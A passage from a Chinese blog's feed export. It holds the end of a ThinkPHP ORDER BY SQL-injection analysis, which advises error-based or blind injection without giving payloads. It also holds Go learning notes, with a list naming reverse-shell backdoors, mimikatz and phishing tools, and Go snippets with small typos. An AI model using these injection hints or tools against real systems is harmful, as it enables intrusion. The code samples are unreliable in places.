class="string">' '</span> . $val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $order = implode(<span class="string">','</span>, $array);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">empty</span>($order) ? <span class="string">' ORDER BY '</span> . $order : <span class="string">''</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>组成的 SQL 语句是这样的：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> xxx <span class="keyword">from</span> xxx <span class="keyword">order</span> <span class="keyword">by</span> $<span class="keyword">order</span> <span class="keyword">limit</span> <span class="number">1</span>;  <span class="comment">-- limit 1 是自动拼接上的</span></span><br></pre></td></tr></table></figure><p>拿出 order by 的常规套路即可，有报错就报错注入，没报错就盲注。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>TP 3 这个注入还是挺实用的，TP 5 还需要继续研究下，如果不能获取到列名，很难利用。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;在 ThinkPHP 5.1.23 之前的版本中存在 SQL 注入漏洞，该漏洞是由于程序在处理 order by 后的参数时，未正确过滤处理
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="https://wywwzjj.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://wywwzjj.top/tags/PHP/"/>
    
      <category term="ThinkPHP" scheme="https://wywwzjj.top/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>Go 学习</title>
    <link href="https://wywwzjj.top/2020/01/24/Go-%E5%AD%A6%E4%B9%A0/"/>
    <id>https://wywwzjj.top/2020/01/24/Go-学习/</id>
    <published>2020-01-24T04:12:07.000Z</published>
    <updated>2020-03-22T10:11:48.059Z</updated>
    
    <content type="html"><![CDATA[<h2 id="为什么要学-Go？"><a href="#为什么要学-Go？" class="headerlink" title="为什么要学 Go？"></a>为什么要学 Go？</h2><blockquote><p>以下引用自左耳听风专栏。</p></blockquote><p>第一，<strong>语言简单，上手快</strong>。Go 语言的语法特性简直是太简单了，简单到你几乎玩不出什么花招，直来直去的，学习难度很低，容易上手。</p><p>第二，<strong>并行和异步编程几乎无痛点</strong>。Go 语言的 Goroutine 和 Channel 这两个神器简直就是并发和异步编程的巨大福音。像 C、C++、Java、Python 和 JavaScript 这些语言的并发和异步的编程方式控制起来就比较复杂了，并且容易出错，但 Go 语言却用非常优雅和流畅的方式解决了这个问题。这对于编程多年受尽并发和异步折磨的我来说，完全就是眼前一亮的感觉。</p><p><img src="https://static001.geekbang.org/resource/image/8d/5f/8df5fd56cbb6343a9030265a5f3a565f.png" alt="img"></p><p>（图片来自 Medium：Why should you learn Go?）</p><p>第三，<strong>Go 语言的 lib 库 “麻雀虽小，五脏俱全”</strong>。Go 语言的 lib 库中基本上有绝大多数常用的库，虽然有些库还不是很好，但我觉得这都不是主要问题，因为随着技术的发展和成熟，这些问题肯定也都会随之解决。</p><p>第四，<strong>C 语言的理念和 Python 的姿态</strong>。C 语言的理念是信任程序员，保持语言的小巧，不屏蔽底层且对底层友好，关注语言的执行效率和性能。而 Python 的姿态是用尽量少的代码完成尽量多的事。于是我能够感觉到，Go 语言是想要把 C 和 Python 统一起来，这是多棒的一件事。</p><p><img src="https://static001.geekbang.org/resource/image/03/f7/03ea333bf7b7bb2fe350c4f433047df7.png" alt="img"></p><p>（图片来自 Medium：Why should you learn Go?）</p><p>所以，即便 Go 语言存在诸多的问题，比如垃圾回收、异常处理、泛型编程等，但相较于上面这几个优势，我认为这些问题都是些小问题。于是就毫不犹豫地入坑了。</p><h2 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h2><p>资源合集：<a href="https://github.com/developer-learning/learning-golang" target="_blank" rel="noopener">https://github.com/developer-learning/learning-golang</a></p><p>官方教程：<a href="https://learn.go.dev/" target="_blank" rel="noopener">https://learn.go.dev/</a></p><p><strong>入门</strong></p><p>首首推，通过 TDD 学习 Go <a href="https://studygolang.gitbook.io/learn-go-with-tests/" target="_blank" rel="noopener">https://studygolang.gitbook.io/learn-go-with-tests/</a></p><p>首推 <a href="https://gobyexample.com/" target="_blank" rel="noopener">Go by Example</a> 作为你的入门教程。然后，<a href="https://go101.org/article/101.html" target="_blank" rel="noopener">Go 101</a> 也是一个很不错的在线电子书。</p><p>The Go Programming Language 中译本：Go 语言圣经</p><p>Go 语言官方的 <a href="https://golang.org/doc/effective_go.html" target="_blank" rel="noopener">Effective Go</a> 是必读的，这篇文章告诉你如何更好地使用 Go 语言，以及 Go 语言中的一些原理。</p><p>web 开发：<a href="https://github.com/astaxie/build-web-application-with-golang/" target="_blank" rel="noopener">https://github.com/astaxie/build-web-application-with-golang/</a> 33.7k 星</p><p><strong>进阶</strong></p><p>查询 Go 项目，<a href="https://gowalker.org/，感觉是" target="_blank" rel="noopener">https://gowalker.org/，感觉是</a> GitHub advance search 的封装。</p><p>Go 语言高级编程 <a href="https://github.com/chai2010/advanced-go-programming-book" target="_blank" rel="noopener">https://github.com/chai2010/advanced-go-programming-book</a></p><p>Go 语言原本 <a href="https://changkun.de/golang/" target="_blank" rel="noopener">https://changkun.de/golang/</a> 学习源码</p><p>如何写出优雅的 Go <a href="https://draveness.me/golang-101" target="_blank" rel="noopener">https://draveness.me/golang-101</a></p><p><a href="https://github.com/qcrao/Go-Questions" target="_blank" rel="noopener">https://github.com/qcrao/Go-Questions</a></p><p><strong>博客</strong></p><p>只收录有深度的博客，请享用！</p><table><thead><tr><th>博客名</th><th>简介</th><th>地址</th></tr></thead><tbody><tr><td>码农桃花源</td><td>本项目作者博客园</td><td><a href="https://www.cnblogs.com/qcrao-2018" target="_blank" rel="noopener">https://www.cnblogs.com/qcrao-2018</a></td></tr><tr><td>欧神开源书《Go 语言原本》</td><td>Golang committers</td><td><a href="https://changkun.de/golang" target="_blank" rel="noopener">https://changkun.de/golang</a></td></tr><tr><td>No Headback</td><td>滴滴技术大神曹春晖</td><td><a href="http://xargin.com/" target="_blank" rel="noopener">http://xargin.com</a></td></tr><tr><td>面向信仰编程</td><td>给 kubernetes 提交 pr 的大神</td><td><a href="https://draveness.me/" target="_blank" rel="noopener">https://draveness.me</a></td></tr><tr><td>煎鱼的迷之博客</td><td>知其然，知其所以然</td><td><a href="https://github.com/EDDYCJY/blog" target="_blank" rel="noopener">https://github.com/EDDYCJY/blog</a></td></tr></tbody></table><p>Go 语言最突出之处是并发编程，Unix 老牌黑客罗勃・派克（Rob Pike）在 Google I/O 上的两个分享，可以让你学习到一些并发编程的模式。</p><ul><li>Go Concurrency Patterns（ <a href="https://talks.golang.org/2012/concurrency.slide" target="_blank" rel="noopener">幻灯片</a>和<a href="https://www.youtube.com/watch?v=f6kdp27TYZs" target="_blank" rel="noopener">演讲视频</a>）。</li><li>Advanced Go Concurrency Patterns（<a href="https://talks.golang.org/2013/advconc.slide" target="_blank" rel="noopener">幻灯片</a>、<a href="https://youtu.be/QDDwwePbDtw" target="_blank" rel="noopener">演讲视频</a>）。</li></ul><p>然后，Go 在 GitHub 的 wiki 上有好多不错的学习资源，你可以从中学习到多。比如：</p><ul><li><a href="https://github.com/golang/go/wiki/Articles" target="_blank" rel="noopener">Go 精华文章列表</a>。</li><li><a href="https://github.com/golang/go/wiki/Blogs" target="_blank" rel="noopener">Go 相关博客列表</a>。</li><li><a href="https://github.com/golang/go/wiki/GoTalks" target="_blank" rel="noopener">Go Talks</a>。</li></ul><p>此外，还有个内容丰富的 Go 资源列表 <a href="https://github.com/avelino/awesome-go" target="_blank" rel="noopener">Awesome Go</a>，推荐看看。</p><p>类似 awesome-go <a href="https://github.com/hackstoic/golang-open-source-projects" target="_blank" rel="noopener">https://github.com/hackstoic/golang-open-source-projects</a></p><p>Go roadmap <a href="https://github.com/Alikhll/golang-developer-roadmap" target="_blank" rel="noopener">https://github.com/Alikhll/golang-developer-roadmap</a></p><p><a href="http://tmrts.com/go-patterns/" target="_blank" rel="noopener">http://tmrts.com/go-patterns/</a></p><p>Uber Go Style Guide <a href="https://github.com/uber-go/guide/blob/master/style.md" target="_blank" rel="noopener">https://github.com/uber-go/guide/blob/master/style.md</a></p><p>官方规范 <a href="https://github.com/golang/go/wiki/CodeReviewComments" target="_blank" rel="noopener">https://github.com/golang/go/wiki/CodeReviewComments</a></p><p>GoLand Tips &amp; Tricks <a href="https://www.bilibili.com/video/av57075824" target="_blank" rel="noopener">https://www.bilibili.com/video/av57075824</a></p><p>Goroutine Leak 检测器，Uber出品。<a href="https://github.com/uber-go/goleak" target="_blank" rel="noopener">https://github.com/uber-go/goleak</a></p><h2 id="有关安全项目"><a href="#有关安全项目" class="headerlink" title="有关安全项目"></a>有关安全项目</h2><p>库</p><ul><li>gopacket - Go语言用于处理网络数据包的库</li><li>xorm - Go语言实现的ORM库，支持多种数据库</li></ul><p>代码安全</p><ul><li>Go-SCP - Go语言安全编码实践指南</li><li>gosec - Go语言源码安全分析工具</li></ul><p>安全工具</p><ul><li>certigo - Go语言编写用于检查/验证证书信息的命令行工具</li><li>Blind-SQL-Injector - Go语言编写的手工盲注辅助工具</li><li>lonely-shell - Go语言实现的反弹Shell后门</li><li>hershell - Go语言反弹Shell后门</li><li>go-deliver - Go语言编写的Payload交互工具</li><li>go-shellcode - Go语言编写的ShellCode执行工具</li><li>go-mimikatz - Go语言版本的Mimikatz</li><li>NtlmSocks - 一个工作在网络层的跨平台哈希传递工具</li><li>CHAOS - Go语言编写的Windows远控工具</li><li>judas - Go语言编写的反向钓鱼工具</li><li>Modlishka - Go语言编写的反向代理钓鱼工具</li><li>Gophish - Go语言编写的开源钓鱼框架</li><li>goddi - Go语言编写的活动目录信息导出工具</li><li>goHackTools - Go语言编写的黑客工具集</li><li>honeybits - 一款Go语言开发的蜜罐</li><li>xsec-checker - Go语言编写的服务器安全检测辅助工具</li><li>janusec - Golang打造的开源WAF网关</li><li>xsec-ip-database - Go语言实现的恶意IP和域名库</li><li>xsec-traffic - Go语言编写的轻量级恶意流量分析程序</li><li>GoCrack - Go语言编写密码爆破平台</li></ul><p>扫描工具</p><ul><li>blacksheepwall - Go语言编写的域名信息搜集工具</li><li>amass - Go语言编写的子域名收集工具</li><li>vuls - Go语言编写的Linux/FreeBSD漏洞扫描器</li><li>gryffin - 大规模Web安全扫描平台</li><li>Gobuster - Kai下敏感目录扫描工具</li><li>OnionScan - Go语言编写的暗网扫描仪</li><li>x-crack - Go语言编写的弱口令扫描器</li><li>kraken - Go语言编写的YARA跨平台扫描器</li></ul><p>网络工具</p><ul><li>GoReplay - Go语言编写HTTP流量记录重放工具</li><li>NATBypass - LCX/Htran在Golang下的实现</li><li>ngrok - 反向代理/内网穿透工具</li><li>brook - Go语言编写的一款跨平台代理应用</li><li>Hyperfox - HTTP/HTTPS流量监控工具</li><li>gost - Go语言编写多功能网络代理转发工具</li><li>gomitmproxy - Go语言实现的Mitmproxy</li><li>netcap - Go语言编写的网络流量分析框架</li></ul><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><p>每个类型都有默认的初值，比如 0，“”，false</p><p>定义的变量必须要用到，实在不用的可以用 “_”</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a, b, c <span class="keyword">int</span> = <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a, b, c = <span class="number">1</span>, <span class="string">'a'</span>, <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    home = os.Getenv(<span class="string">"HOME"</span>)</span><br><span class="line">    user = os.Getenv(<span class="string">"USER"</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">a, b, c := <span class="number">1</span>, <span class="string">'a'</span>, <span class="literal">false</span>  <span class="comment">// 只能在函数内使用</span></span><br></pre></td></tr></table></figure><h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><blockquote><p>必须显式强制类型转换</p></blockquote><p>布尔：bool</p><p>整型：int、(u)int8、(u)int16、(u)int32、(u)int64、uintptr</p><p>浮点：float32、float64、原生复数：complex64、complex128</p><p>字符串：string</p><p>字符：rune（int32 别名）</p><p>byte：（int8 别名）</p><p><strong>派生：</strong></p><ul><li>结构体 struct</li><li>channel</li><li>func</li><li>slice</li><li>interface</li><li>map</li></ul><p>可用 type 设置别名</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> S <span class="keyword">string</span></span><br></pre></td></tr></table></figure><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Go operator precedence:</span><br><span class="line">1. *   /   %  &lt;&lt;  &gt;&gt;  &amp;  &amp;^</span><br><span class="line">2. +   -   |  ^</span><br><span class="line">3. ==  !=  &lt;  &lt;=  &gt;   &gt;=</span><br><span class="line">4. &amp;&amp;</span><br><span class="line">5. ||</span><br></pre></td></tr></table></figure><h3 id="new-与-make"><a href="#new-与-make" class="headerlink" title="new 与 make"></a>new 与 make</h3><p>Go 提供了两种分配原语，即 new 和 make。</p><p>new 是分配一个内存，返回一个内存地址，它不会初始化内存，只会将内存置零。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> SyncedBuffer <span class="keyword">struct</span> &#123;</span><br><span class="line">    lock sync.Mutex</span><br><span class="line">    buffer bytes.Buffer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p := <span class="built_in">new</span>(SyncedBuffer)  <span class="comment">// type *SyncedBuffer</span></span><br></pre></td></tr></table></figure><p>make 只用于创建 slice、map 和 channel，并返回一个“已初始化”的值。</p><h3 id="常量与枚举"><a href="#常量与枚举" class="headerlink" title="常量与枚举"></a>常量与枚举</h3><p>未指定类型的常量类似替换，不需要关心类型转换</p><p>Go 里的大写有其他含义，常量不再大写</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> b <span class="keyword">string</span> = <span class="string">"string"</span>  <span class="comment">// 指定后需要显式类型转换</span></span><br><span class="line"><span class="keyword">const</span> a = <span class="string">"string"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 枚举</span></span><br><span class="line"><span class="keyword">const</span>(</span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = <span class="number">2</span></span><br><span class="line">    c = <span class="number">3</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span>(</span><br><span class="line">    cpp = ioat</span><br><span class="line">    python</span><br><span class="line">    java</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span>(</span><br><span class="line">    _ = <span class="literal">iota</span>  <span class="comment">// 通过赋予空白标识符来忽略第一个值</span></span><br><span class="line">    b = <span class="number">1</span> &lt;&lt; (<span class="number">10</span> * <span class="literal">iota</span>)</span><br><span class="line">    kb</span><br><span class="line">    mb</span><br><span class="line">    gb</span><br><span class="line">    tb</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> contents, err := ioutil.ReadFile(filename); err != <span class="literal">nil</span> &#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认添加了 break，不 break 需指定</span></span><br><span class="line"><span class="keyword">switch</span> i &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>:</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g := <span class="string">""</span></span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> g:</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">whatAmI := <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> t := i.(<span class="keyword">type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">bool</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">int</span>:</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">whatAmI(<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">i := <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i &lt;= <span class="number">3</span> &#123;</span><br><span class="line">    fmt.Println(i)</span><br><span class="line">    i </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j := <span class="number">1</span>; j &lt; <span class="number">3</span>; j++ &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"loop"</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>Go 只有值传递，每次传值都拷贝了一个副本，只是这副本里的某个部分可能指着同一块内存，比如 slice。</p><p>可传递指针</p><p>返回一个局部变量的地址没有问题，该局部变量对应的数据在函数返回后依然有效，编译器采用逃逸分析技术。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回多个值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">eval</span><span class="params">(a, b <span class="keyword">int</span>, opt <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">int</span>, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>, fmt.Errorf(<span class="string">"error: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回值命名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span> <span class="title">t</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    t = <span class="string">"test"</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数参数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">apply</span><span class="params">(op <span class="keyword">func</span>(<span class="keyword">int</span>, <span class="keyword">int</span>)</span> <span class="title">int</span>, <span class="title">a</span>, <span class="title">b</span> <span class="title">int</span>) <span class="title">int</span></span> &#123;</span><br><span class="line">    p := reflect.ValueOf(op).Pointer()</span><br><span class="line">    opName := runtime.FuncForPC(p).Name()</span><br><span class="line">    fmt.Printf(<span class="string">"Calling function %s with args %d, %d"</span>, opName, a, b)</span><br><span class="line">    <span class="keyword">return</span> op(a, b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匿名函数</span></span><br><span class="line">apply(<span class="function"><span class="keyword">func</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匿名函数递归，不直接支持。</span></span><br><span class="line"><span class="keyword">var</span> f <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">int</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">f</span> = <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    f()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可变参数列表，无默认参数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sumArgs</span><span class="params">(members ...<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    s := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> numbers &#123;</span><br><span class="line">        s += numbers[i]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">arr := [...]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">sumArgs(arr...)</span><br></pre></td></tr></table></figure><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>指针不能运算</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a <span class="keyword">int</span> = <span class="number">2</span></span><br><span class="line"><span class="keyword">var</span> pa *<span class="keyword">int</span> = &amp;a</span><br><span class="line">*pa = <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>Go 一般不用数组，用切片</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr [<span class="number">5</span>]<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">b := [<span class="number">5</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">b := [...]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> grid [<span class="number">2</span>][<span class="number">3</span>]<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> grid [][]<span class="keyword">int</span> = [][]<span class="keyword">int</span>&#123;&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">grid := [<span class="number">2</span>][<span class="number">3</span>]<span class="keyword">int</span>&#123;&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v := <span class="keyword">range</span> grid &#123;</span><br><span class="line">    fmt.Println(k, v)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [10]int，[5]int 是不同类型，数组传递是值传递，会拷贝</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printArray</span><span class="params">(arr [10]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    fmt.Println(arr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><p>切片本身没有数据，是对底层数组的一个 view，是功能强悍的”动态数组“。</p><p>切片通过对数组进行封装，为数据序列提供了更通用、强大的接口。</p><p>除了矩阵变换这类需要明确维度的情况外， Go 中大部分数组编程都是通过切片来实现的。</p><p>切片保存了对底层数组的引用，若将某个切片赋值给另一个切片，它们将引用同一个数组。</p><p><code>len(s)</code> 用来获取长度，当前有多少个值，用了多少</p><p><code>cap(s)</code> 切片总容量</p><p><code>append(s, tg)</code> 添加元素</p><p><code>copy(dst, src)</code> 拷贝切片</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化</span></span><br><span class="line">slice := []<span class="keyword">int</span></span><br><span class="line">slice := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line">slice := <span class="built_in">make</span>([]<span class="keyword">type</span>, <span class="built_in">len</span>)  <span class="comment">// 创建空切片，可不指定 cap</span></span><br><span class="line">slice := <span class="built_in">make</span>([]<span class="keyword">type</span>, <span class="built_in">len</span>, <span class="built_in">cap</span>)</span><br><span class="line"></span><br><span class="line">fmt.Println(arr[:])</span><br><span class="line">fmt.Println(arr[:<span class="number">3</span>])</span><br><span class="line">fmt.Println(arr[<span class="number">2</span>:])</span><br><span class="line">fmt.Println(arr[<span class="number">3</span>:<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多次切片，可以超过上次切片范围，不可超过 cap(s)，即向后扩展</span></span><br><span class="line">s := arr[<span class="number">3</span>:<span class="number">5</span>]</span><br><span class="line">rs := s[<span class="number">4</span>:<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩展，由于是值传递，必须用个变量来接收，底层将创建一个新的 array 来支撑切片</span></span><br><span class="line">b = <span class="built_in">append</span>(b, <span class="number">10</span>)</span><br><span class="line">b = <span class="built_in">append</span>(b, s...)  <span class="comment">// 不能 +，但可变参数能直接添加切片</span></span><br><span class="line">fmt.Println(b)</span><br></pre></td></tr></table></figure><h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">intList := []<span class="keyword">int</span>&#123;<span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">0</span>&#125;</span><br><span class="line">float8List := []<span class="keyword">float64</span>&#123;<span class="number">4.2</span>, <span class="number">5.9</span>, <span class="number">12.3</span>, <span class="number">10.0</span>, <span class="number">50.4</span>, <span class="number">99.9</span>, <span class="number">31.4</span>, <span class="number">27.81828</span>, <span class="number">3.14</span>&#125;</span><br><span class="line">stringList := []<span class="keyword">string</span>&#123;<span class="string">"a"</span>, <span class="string">"c"</span>, <span class="string">"b"</span>, <span class="string">"d"</span>, <span class="string">"f"</span>, <span class="string">"i"</span>, <span class="string">"z"</span>, <span class="string">"x"</span>, <span class="string">"w"</span>, <span class="string">"y"</span>&#125;</span><br><span class="line"></span><br><span class="line">sort.Ints(intList)</span><br><span class="line">sort.Sort(sort.IntSlice(intList))</span><br><span class="line">sort.Sort(sort.Reverse(sort.IntSlice(intList)))</span><br><span class="line">sort.Sort(sort.Reverse(sort.Float64Slice(float8List)))</span><br><span class="line">sort.Sort(sort.Reverse(sort.StringSlice(stringList)))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为什么好好的 []int 类型还要类型转换一次呢？答案在下面，只有这个别名类型才实现了这些接口。</span></span><br><span class="line"><span class="comment">// 是不是还与 Go 的显式类型转换有关？</span></span><br><span class="line"><span class="keyword">type</span> IntSlice []<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p IntSlice)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span>           &#123; <span class="keyword">return</span> <span class="built_in">len</span>(p) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p IntSlice)</span> <span class="title">Less</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123; <span class="keyword">return</span> p[i] &lt; p[j] &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p IntSlice)</span> <span class="title">Swap</span><span class="params">(i, j <span class="keyword">int</span>)</span></span>      &#123; p[i], p[j] = p[j], p[i] &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sort is a convenience method.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p IntSlice)</span> <span class="title">Sort</span><span class="params">()</span></span> &#123; Sort(p) &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义排序</span></span><br><span class="line">sort.Slice(arr, <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> arr[i][<span class="number">0</span>] &lt; arr[j][<span class="number">0</span>]</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个为内置 `[]string` 类型的别名的 `ByLength` 类型</span></span><br><span class="line"><span class="keyword">type</span> ByLength []<span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 `sort.Interface` 的 `Len`，`Less` 和 `Swap` 方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s ByLength)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(s)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s ByLength)</span> <span class="title">Swap</span><span class="params">(i, j <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    s[i], s[j] = s[j], s[i]</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span 